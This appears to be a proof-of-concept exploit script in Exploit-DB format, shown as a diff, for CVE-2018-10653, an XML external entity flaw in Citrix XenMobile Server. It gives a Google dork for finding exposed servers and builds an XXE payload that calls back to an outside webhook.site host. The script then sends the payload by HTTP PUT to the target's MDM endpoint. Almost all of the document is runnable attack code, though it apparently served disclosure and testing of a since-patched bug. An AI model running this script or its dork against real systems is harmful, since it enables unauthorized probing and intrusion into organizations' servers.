@@ -1,0 +1,47 @@
+# Exploit Title: Citrix XenMobile Server 10.8 - XML External Entity Injection
+# Google Dork: inurl:zdm logon
+# Date: 2019-11-28
+# Exploit Author: Jonas Lejon
+# Vendor Homepage: https://www.citrix.com
+# Software Link:
+# Version: XenMobile Server 10.8 before RP2 and 10.7 before RP3
+# Tested on: XenMobile
+# CVE : CVE-2018-10653
+
+#!/usr/bin/python3
+##
+## PoC exploit test for the security vulnerability CVE-2018-10653 in
+XenMobile Server 10.8 before RP2 and 10.7 before RP3
+##
+## This PoC was written by Jonas Lejon 2019-11-28
+<jonas.xenmobile@triop.se> https://triop.se
+## Reported to Citrix 2017-10, patch released 2018-05
+##
+
+import requests
+import sys
+from pprint import pprint
+import uuid
+
+# Surf to https://webhook.site and copy/paste the URL below. Used for
+XXE callback
+WEBHOOK = "https://webhook.site/310d8cd9-ebd3-xxx-xxxx-xxxxxx/"
+
+id = str(uuid.uuid1())
+
+xml = '''<?xml version="1.0" encoding="UTF-8"
+standalone='no'?><!DOCTYPE plist [<!ENTITY % j00t9 SYSTEM "''' +
+WEBHOOK + id + '''/test.dtd">%j00t9; ]>'''
+
+print(id)
+
+response = requests.put(sys.argv[1] + '/zdm/ios/mdm', verify=False,
+ headers=
+{'User-Agent': 'MDM/1.0',
+'Connection': 'close',
+'Content-Type': 'application/x-apple-aspen-mdm'},
+data=xml,stream=True
+)
+print(response.content)
+print(response.text)
+pprint(response)
